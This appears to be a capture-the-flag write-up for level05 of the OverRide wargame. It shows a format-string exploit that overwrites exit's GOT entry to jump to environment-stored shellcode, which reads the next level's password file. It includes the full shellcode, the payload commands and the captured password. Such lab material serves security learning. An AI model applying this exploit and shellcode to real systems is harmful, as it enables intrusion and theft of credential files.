# We test
> python -c 'print "AAAA"' | ./level05    # So the program lower case what we input
aaaa

We read decompiled code, we find a printf we might be able to exploit.


level05@OverRide:~$ python -c 'print "aaaa"+"%p " * 15' | ./level05
aaaa0x64 0xf7fcfac0 0xf7ec3add 0xffffd6df 0xffffd6de (nil) 0xffffffff 0xffffd764 0xf7fdb000 0x61616161 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 
# printf the arg place is 10

# Let's break the printf, the idea is to override the GOT of exit with the addresse of an env variable containing shellcode

# Don't forget the NOP sled
> export SHELLCODE=$`python -c "print '\x90' * 128 + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass'"`
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    printf("%p\n", getenv("SHELLCODE"));
}

level04@OverRide:/tmp$ gcc -m32 getenv.c 

# So we need 080497e0 R_386_JUMP_SLOT   exit < 0x080497e0 and a shellcode adrress (level04) < 0xffffd884 --> our shellcode is stored in ENV as in level04

# Now we need to build our exploit
[adrr_exit][%adrrs_shellcoded%10$n]


# BUT BUT BUT BUT As we can see, the format we use is %d witch take an int, if whe convert 0xffffd884 --> adress of exit in got, to int = 4294957188 and this value is > int_max, so
it won't work if use like that

# one method whe can use is to spilt in 2 our address and write 2 bits by 2 bits, so now if we convert our adress 0xffff = 65535 | d884 = 55299
Now we have 2 value to write 55299 and 65535-55299 = 10236, we need addr_exit and addr_exit+2, so 2+2=4

# Since we need to write the adress in little endian, we will start by 55299 so to complete our adress we need to calculate the complement in order to attain the good adress
So how do you get to 65535 after having write 55299 char, you write 65535-55299 = 10236


# Now we need to build our exploit again
[adrr_exit][adrr_exit+2][%adrrs_sh%10\$hn][%ellcoded%11\$hn] #n become hn (we use short)

# Don't forget to add place for the 8 char before your adresse and you can use almost any adress in your nop sled
"\xe0\x97\x04\x08"+"\xe2\x97\x04\x08"+"%55299x%10$hn"+"%10228x%11$hn"

# Let's exploit
> python -c "print '\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe2'[::-1] + '%55299x' + '%10\$n' + '%10228x' + '%11\$n'" | ./level05

h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
